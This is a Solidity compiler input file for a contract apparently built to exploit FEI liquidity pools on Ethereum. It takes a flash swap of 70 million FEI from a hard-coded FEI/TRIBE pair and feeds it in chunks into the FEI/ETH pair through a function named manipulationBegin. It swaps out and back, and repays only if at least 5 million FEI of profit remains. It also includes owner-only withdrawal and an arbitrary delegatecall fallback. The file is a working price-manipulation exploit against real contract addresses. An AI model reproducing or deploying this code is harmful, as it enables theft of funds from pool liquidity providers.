{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"F.sol":{"content":"interface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    \r\n    function maxTransferAmount() external view returns (uint256);\r\n}\r\n\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n\r\n    constructor () {\r\n        _owner = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == _owner;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint x, uint y) internal pure returns (uint z) {\r\n        require((z = x + y) >= x, 'ds-math-add-overflow');\r\n    }\r\n\r\n    function sub(uint x, uint y) internal pure returns (uint z) {\r\n        require((z = x - y) <= x, 'ds-math-sub-underflow');\r\n    }\r\n\r\n    function mul(uint x, uint y) internal pure returns (uint z) {\r\n        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');\r\n    }\r\n    \r\n    function div(uint x, uint y) internal pure returns (uint z) {\r\n        z = x / y;\r\n    }\r\n}\r\n\r\nlibrary PancakeLibrary {\r\n    using SafeMath for uint;\r\n    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset\r\n    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {\r\n        require(amountA > 0, 'PancakeLibraryFromMe: INSUFFICIENT_AMOUNT');\r\n        require(reserveA > 0 && reserveB > 0, 'PancakeLibraryFromMe: INSUFFICIENT_LIQUIDITY');\r\n        amountB = amountA.mul(reserveB) / reserveA;\r\n    }\r\n\t\r\n\t function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut, uint fee) internal pure returns (uint amountOut) {\r\n        require(amountIn > 0, 'PancakeLibraryFromMe: INSUFFICIENT_INPUT_AMOUNT');\r\n        require(reserveIn > 0 && reserveOut > 0, 'PancakeLibraryFromMe: INSUFFICIENT_LIQUIDITY');\r\n\t\tuint realFee = 10000 - fee;\r\n        uint amountInWithFee = amountIn.mul(realFee);\r\n        uint numerator = amountInWithFee.mul(reserveOut);\r\n        uint denominator = reserveIn.mul(10000).add(amountInWithFee);\r\n        amountOut = numerator / denominator;\r\n    }\r\n\t\r\n\tfunction getAmountIn(uint amountOut, uint reserveIn, uint reserveOut, uint fee) internal pure returns (uint amountIn) {\r\n        require(amountOut > 0, 'PancakeLibraryFromMe: INSUFFICIENT_OUTPUT_AMOUNT');\r\n        require(reserveIn > 0 && reserveOut > 0, 'PancakeLibraryFromMe: INSUFFICIENT_LIQUIDITY');\r\n\t\tuint realFee = 10000 - fee;\r\n        uint numerator = reserveIn.mul(amountOut).mul(10000);\r\n        uint denominator = reserveOut.sub(amountOut).mul(realFee);\r\n        amountIn = (numerator / denominator).add(1);\r\n    }\r\n}\r\n\r\nlibrary constants {\r\n\taddress constant FeiTribePair = 0x9928e4046d7c6513326cCeA028cD3e7a91c7590A; //fei = t0\r\n\taddress constant Fei = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;\r\n\taddress constant FeiEthPair = 0x94B0A3d511b6EcDb17eBF877278Ab030acb0A878; //fei = t0\r\n\taddress constant WEth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n}\r\n\r\ninterface ISwapPair {\r\n\tfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\n\tfunction token0() external view returns(address);\r\n\tfunction token1() external view returns(address);\r\n\tfunction getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\r\n\tfunction mint(address to) external returns (uint liquidity);\r\n\tfunction burn(address to) external returns (uint amount0, uint amount1);\r\n\tfunction sync() external;\r\n}\r\n\r\ncontract TheBaise is Ownable {\r\n\tusing SafeMath for uint;\r\n\tmapping(address => uint) private borrowed;\r\n\taddress private impl;\r\n    \r\n\tconstructor() {\r\n\t}\r\n\t\r\n\tfunction setImpl(address _impl) public onlyOwner {\r\n\t\timpl = _impl;\r\n\t}\r\n\t\r\n\tfunction start() public onlyOwner { //0 = gen\r\n\t\tISwapPair(constants.FeiTribePair).swap(70000000*1e18, 0, address(this), new bytes(0x1));\r\n\t}\r\n\t\r\n\tfunction manipulationBegin() internal {\r\n\t\tuint balanceBefore = IERC20(constants.Fei).balanceOf(constants.FeiEthPair);\r\n\t\twhile (IERC20(constants.Fei).balanceOf(address(this)) > (2500000 * 1e18)) {\r\n\t\t\tIERC20(constants.Fei).transfer(constants.FeiEthPair, 2500000 * 1e18);\r\n\t\t}\r\n\t\tIERC20(constants.Fei).transfer(constants.FeiEthPair, IERC20(constants.Fei).balanceOf(address(this)));\r\n\t\tuint delta = IERC20(constants.Fei).balanceOf(constants.FeiEthPair) - balanceBefore;\r\n\t\t(uint reserve0, uint reserve1, ) = ISwapPair(constants.FeiEthPair).getReserves();\r\n\t\tuint out = PancakeLibrary.getAmountOut(delta, reserve0, reserve1, 30);\r\n\t\tISwapPair(constants.FeiEthPair).swap(0, out - 1, address(this), new bytes(0));\r\n\t\t\r\n\t\t(reserve0, reserve1, ) = ISwapPair(constants.FeiEthPair).getReserves();\r\n\t\tout = PancakeLibrary.getAmountOut(IERC20(constants.WEth).balanceOf(address(this)), reserve1, reserve0, 30);\r\n\t\tIERC20(constants.WEth).transfer(constants.FeiEthPair, IERC20(constants.WEth).balanceOf(address(this)));\r\n\t\tISwapPair(constants.FeiEthPair).swap(out - 1, 0, address(this), new bytes(0));\r\n\t\t\r\n\t\trefundLoans();\r\n\t}\r\n\t\r\n\tfunction refundLoans() internal {\r\n\t\trequire(IERC20(constants.Fei).balanceOf(address(this)) > (borrowed[constants.FeiTribePair].mul(10000).div(10000 - 30) + 1), 'ENE');\r\n\t\trequire(IERC20(constants.Fei).balanceOf(address(this)) > (borrowed[constants.FeiTribePair].mul(10000).div(10000 - 30) + (5000000 * 1e18)), 'ENB');\r\n\t\tIERC20(constants.Fei).transfer(constants.FeiTribePair, borrowed[constants.FeiTribePair].mul(10000).div(10000 - 30) + 1);\r\n\t}\r\n\t\r\n\tfunction uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {\r\n\t\trequire(msg.sender == constants.FeiTribePair);\r\n\t\tborrowed[constants.FeiTribePair] = amount0;\r\n\t\tmanipulationBegin();\r\n\t}\r\n\t\r\n\tfunction approveThisTokenToBeWithdrawn(address token, uint amount) public onlyOwner {\r\n\t\tIERC20(token).approve(msg.sender, amount);\r\n\t}\r\n\t\r\n\tfunction _delegate(address implementation) public onlyOwner {\r\n    assembly {\r\n      // Copy msg.data. We take full control of memory in this inline assembly\r\n      // block because it will not return to Solidity code. We overwrite the\r\n      // Solidity scratch pad at memory position 0.\r\n      calldatacopy(0, 0, calldatasize())\r\n\r\n      // Call the implementation.\r\n      // out and outsize are 0 because we don't know the size yet.\r\n      let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\r\n\r\n      // Copy the returned data.\r\n      returndatacopy(0, 0, returndatasize())\r\n\r\n      switch result\r\n      // delegatecall returns 0 on error.\r\n      case 0 { revert(0, returndatasize()) }\r\n      default { return(0, returndatasize()) }\r\n    }\r\n\t}\r\n\t\r\n\tfallback() external {\r\n\t\t_delegate(impl);\r\n\t}\r\n}\r\n"}}}